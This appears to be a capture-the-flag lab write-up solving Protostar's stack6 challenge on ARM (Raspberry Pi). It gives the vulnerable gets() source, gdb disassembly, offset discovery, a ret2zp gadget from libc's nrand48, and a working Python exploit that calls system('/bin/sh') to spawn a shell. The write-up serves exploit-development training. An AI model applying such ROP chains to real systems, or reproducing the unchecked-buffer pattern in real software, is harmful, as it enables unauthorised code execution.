## Protostar ARM ./stack6


#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define JUMP_GUARD 71

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);
  /**
  I replaced this piece of code because doesn't work in ARM neither changing
  the value of our stack (0x7efdf000)

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  The following lines of code are added in order to perform a trivial check and don't allow to jump in the stack

  */
  //printf ("Jump to : %x%x%x%x\n", buffer[JUMP_GUARD], buffer[72], buffer[73], buffer[74]);
  if( buffer[JUMP_GUARD] >= 0x7e && buffer[JUMP_GUARD] <=0x7f ) {
     printf("bzzzt... don't jump to the stack\n");
     _exit(1);
   }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

This challenge is pretty similar to the previous one, but in this case we can't do an arbitrary jump due to the check introduced.  
Before to go ahead with this challenge I recommend to read this [blogpost](https://blog.attify.com/demystifying-ret2zp/) related to `ret2libc/ret2zp`.


Let's start, opening the binary file and performing some checks

```code
pi@raspberrypi:~/protostar/stack6 $ checksec stack6
[*] '/home/pi/protostar/stack6/stack6'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

```code
pi@raspberrypi:~/protostar/stack6 $ gdb ./stack6

...

Reading symbols from ./stack6...done.
gef➤  b main
Breakpoint 1 at 0x1056c: file stack6.c, line 27.
gef➤  disassemble getpath
Dump of assembler code for function getpath:
   0x000104f0 <+0>:	push	{r11, lr}
   0x000104f4 <+4>:	add	r11, sp, #4
   0x000104f8 <+8>:	sub	sp, sp, #64	; 0x40
   0x000104fc <+12>:	ldr	r0, [pc, #100]	; 0x10568 <getpath+120>
   0x00010500 <+16>:	bl	0x103a0 <printf@plt>
   0x00010504 <+20>:	ldr	r3, [pc, #96]	; 0x1056c <getpath+124>
   0x00010508 <+24>:	ldr	r3, [r3]
   0x0001050c <+28>:	mov	r0, r3
   0x00010510 <+32>:	bl	0x103b8 <fflush@plt>
   0x00010514 <+36>:	sub	r3, r11, #68	; 0x44
   0x00010518 <+40>:	mov	r0, r3
   0x0001051c <+44>:	bl	0x103ac <gets@plt>
   0x00010520 <+48>:	ldrb	r3, [r11, #3]
   0x00010524 <+52>:	cmp	r3, #125	; 0x7d
   0x00010528 <+56>:	bls	0x1054c <getpath+92>
   0x0001052c <+60>:	ldrb	r3, [r11, #3]
   0x00010530 <+64>:	sxtb	r3, r3
   0x00010534 <+68>:	cmp	r3, #0
   0x00010538 <+72>:	blt	0x1054c <getpath+92>
   0x0001053c <+76>:	ldr	r0, [pc, #44]	; 0x10570 <getpath+128>
   0x00010540 <+80>:	bl	0x103d0 <puts@plt>
   0x00010544 <+84>:	mov	r0, #1
   0x00010548 <+88>:	bl	0x103c4 <_exit@plt>
   0x0001054c <+92>:	sub	r3, r11, #68	; 0x44
   0x00010550 <+96>:	mov	r1, r3
   0x00010554 <+100>:	ldr	r0, [pc, #24]	; 0x10574 <getpath+132>
   0x00010558 <+104>:	bl	0x103a0 <printf@plt>
   0x0001055c <+108>:	nop			; (mov r0, r0)
   0x00010560 <+112>:	sub	sp, r11, #4
   0x00010564 <+116>:	pop	{r11, pc}
   0x00010568 <+120>:	andeq	r0, r1, r0, lsl r6
   0x0001056c <+124>:	andeq	r1, r2, r8, lsr r0
   0x00010570 <+128>:	andeq	r0, r1, r4, lsr #12
   0x00010574 <+132>:	andeq	r0, r1, r8, asr #12
End of assembler dump.
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x00010000 0x00011000 0x00000000 r-x /home/pi/protostar/stack6/stack6
0x00020000 0x00021000 0x00000000 r-x /home/pi/protostar/stack6/stack6
0x00021000 0x00022000 0x00001000 rwx /home/pi/protostar/stack6/stack6
0x76e6b000 0x76fa3000 0x00000000 r-x /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fa3000 0x76fb3000 0x00138000 --- /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb3000 0x76fb5000 0x00138000 r-x /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb5000 0x76fb6000 0x0013a000 rwx /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb6000 0x76fb9000 0x00000000 rwx
0x76fb9000 0x76fbd000 0x00000000 r-x /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fbd000 0x76fcc000 0x00004000 --- /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fcc000 0x76fcd000 0x00003000 r-x /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fcd000 0x76fce000 0x00004000 rwx /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fce000 0x76fee000 0x00000000 r-x /lib/arm-linux-gnueabihf/ld-2.28.so
0x76ff9000 0x76ffb000 0x00000000 rwx
0x76ffb000 0x76ffc000 0x00000000 r-x [sigpage]
0x76ffc000 0x76ffd000 0x00000000 r-- [vvar]
0x76ffd000 0x76ffe000 0x00000000 r-x [vdso]
0x76ffe000 0x76fff000 0x00020000 r-x /lib/arm-linux-gnueabihf/ld-2.28.so
0x76fff000 0x77000000 0x00021000 rwx /lib/arm-linux-gnueabihf/ld-2.28.so
0x7efdf000 0x7f000000 0x00000000 rwx [stack]
0xffff0000 0xffff1000 0x00000000 r-x [vectors]

```

The check `if( buffer[83] >= 0x7e && buffer[83] <=0x7f )` is introduced by me to prevents a jump in an address mapped in the stack `[0x7efdf000 0x7f000000]`. The idea, according with the blogpost, is to jump to the `system()` which has `0x76ea39c8` as address.

As explained in the challenge `stack4`, we can use `pwn cyclic` where place in our user input the address to jump.

`pwn cyclic 90` and we generate a string which will support us:
`aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa`

and let's use it continuing the execution of the program

```code
input path please: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
got path aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa

Program received signal SIGBUS, Bus error.
0x61616172 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x5a      
$r1  : 0x0       
$r2  : 0x33c06200
$r3  : 0x33c06200
$r4  : 0x0       
$r5  : 0x000105d0  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
$r6  : 0x00010400  →  <_start+0> mov r11,  #0
$r7  : 0x0       
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x76fff000  →  0x00030f44  →  0x00000000
$r11 : 0x61616171 ("qaaa"?)
$r12 : 0x6c      
$sp  : 0x7efff448  →  "saaataaa"
$lr  : 0x00010588  →  <getpath+152> nop ; (mov r0,  r0)
$pc  : 0x61616172 ("raaa"?)
$cpsr: [negative ZERO CARRY overflow interrupt fast thumb]
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7efff448│+0x0000: "saaataaa"	 ← $sp
0x7efff44c│+0x0004: "taaa"
0x7efff450│+0x0008: 0x00000000
0x7efff454│+0x000c: 0x76e82718  →  <__libc_start_main+268> bl 0x76e99780 <__GI_exit>
0x7efff458│+0x0010: 0x76fb5000  →  0x00149f10
0x7efff45c│+0x0014: 0x7efff5a4  →  0x7efff6ea  →  "/home/pi/protostar/stack6/stack6"
0x7efff460│+0x0018: 0x00000001
0x7efff464│+0x001c: 0x000105a8  →  <main+0> push {r11,  lr}
───────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616172
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack6", stopped 0x61616172 in ?? (), reason: SIGBUS
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

We can see the program fails trying to jump to `0x61616172` and, as explained in the `stack4` writeup, we have to check, due to LSB, if the address is `0x61616172` or `0x61616173`.  
In the [CPSR](http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0311d/ch02s04s02.html) (Current Program Status Register) we can see the `thumb` flag is lowercase so the value is 0 and the address to check is `0x61616172` (if we want to perform a more detailed check about this or we don't have gef-dashboard I suggest to check my writeup about the `stack4`).

We can now calculate our offset  
```code
pi@raspberrypi:~/build_ret $ pwn cyclic -l 0x61616172
68
```

and now we can start to look for the values needed to execute a ret2zp.


As suggested in the blogpost, we can take a look to `nrand48` or `lrand48`, both of them libc functions.

```code
gef➤  disassemble nrand48
Dump of assembler code for function nrand48:
   0x76e9ac04 <+0>:	ldr	r3, [pc, #72]	; 0x76e9ac54 <nrand48+80>
   0x76e9ac08 <+4>:	ldr	r12, [pc, #72]	; 0x76e9ac58 <nrand48+84>
   0x76e9ac0c <+8>:	add	r3, pc, r3
   0x76e9ac10 <+12>:	push	{r4, lr}
   0x76e9ac14 <+16>:	sub	sp, sp, #8
   0x76e9ac18 <+20>:	ldr	r4, [r3, r12]
   0x76e9ac1c <+24>:	ldr	r1, [pc, #56]	; 0x76e9ac5c <nrand48+88>
   0x76e9ac20 <+28>:	mov	r2, sp
   0x76e9ac24 <+32>:	ldr	r3, [r4]
   0x76e9ac28 <+36>:	add	r1, pc, r1
   0x76e9ac2c <+40>:	str	r3, [sp, #4]
   0x76e9ac30 <+44>:	bl	0x76e9adec <__nrand48_r>
   0x76e9ac34 <+48>:	ldr	r2, [sp, #4]
   0x76e9ac38 <+52>:	ldr	r3, [r4]
   0x76e9ac3c <+56>:	ldr	r0, [sp]
   0x76e9ac40 <+60>:	cmp	r2, r3
   0x76e9ac44 <+64>:	bne	0x76e9ac50 <nrand48+76>
   0x76e9ac48 <+68>:	add	sp, sp, #8
   0x76e9ac4c <+72>:	pop	{r4, pc}
   0x76e9ac50 <+76>:	bl	0x76f546ac <__stack_chk_fail>
   0x76e9ac54 <+80>:	andseq	r10, r1, r12, ror #7
   0x76e9ac58 <+84>:	andeq	r0, r0, r12, asr #2
   0x76e9ac5c <+88>:	andseq	sp, r1, r8, lsl #10
End of assembler dump.
```

we are interested to the address `0x76e9ac3c`, `0x76e9ac48` `0x76e9ac4c` and we don't care too much about `0x76e9ac40 <+60>:	cmp	r2, r3` and `0x76e9ac44 <+64>:	bne	0x76e9ac50 <nrand48+76>` (but our technique can fail if the result of `cmp` will be ZERO, the flag ZERO is set and the branch `bne` will be executed).

Let's focus on this gadget (a series of instructions)

```code
...
0x76e9ac3c <+56>:	ldr	r0, [sp]
0x76e9ac40 <+60>:	cmp	r2, r3
0x76e9ac44 <+64>:	bne	0x76e9ac50 <nrand48+76>
0x76e9ac48 <+68>:	add	sp, sp, #8
0x76e9ac4c <+72>:	pop	{r4, pc}
...
```

If we jump to `0x76e9ac3c`
1. we have set `r0` to the address of string `"/bin/sh"`
2. we have to incremenent `sp` by `8`
3. we can call the `system()` with the pop instruction

```code
gef➤  p system
$1 = {int (const char *)} 0x76ea39c8 <__libc_system>
gef➤  search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/lib/arm-linux-gnueabihf/libc-2.28.so'(0x76e6b000-0x76fa3000), permission=r-x
  0x76f96b6c - 0x76f96b73  →   "/bin/sh"
```
This is the idea (more or less) about the stack

|STACK        |  Note           |
| :-------------: | :-------------: |
|_0x76f96b73_| _/bin/sh address_  |
| _fill_ | to overcome` add    sp, sp, #8`|
| _fill_ |to overcome ` add    sp, sp, #8`|
| _0x76ea39c8_|_system() address_ |
| ... | ... |

so, let's write our little exploit, according with the information collected so far

```python
import struct

padding = 'A' * 68
filler = 'B'

nrand48 = 0x76e9ac3c
bash = 0x76f96b6c
system =  0x76ea39c8

payload = padding + struct.pack('<I', nrand48) + struct.pack ('<I', bash) + filler + filler + struct.pack('<I', system)

print payload
```
and let's try it

``` code
pi@raspberrypi:~/protostar/stack6 $ python exploit.py > exploit
pi@raspberrypi:~/protostar/stack6 $ cat exploit - | ./stack6
input path please:
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<��vlk�vBBBBBBBB�9�v
pwd
/home/pi/protostar/stack6
exit
```

Done :)

---

Let's try to check my 'patch' in the source code, jumping to the stack.

```python
import struct

padding = 'A' * 68
address_stack = 0x7efdf100

payload = padding + struct.pack('<I', address_stack)

print payload
```

```code
pi@raspberrypi:~/protostar/stack6 $ python check_patch.py > address_stack
pi@raspberrypi:~/protostar/stack6 $ cat address_stack - | ./stack6
input path please: Jump to : 7e0f5ff
bzzzt... don't jump to the stack

```

It works :)
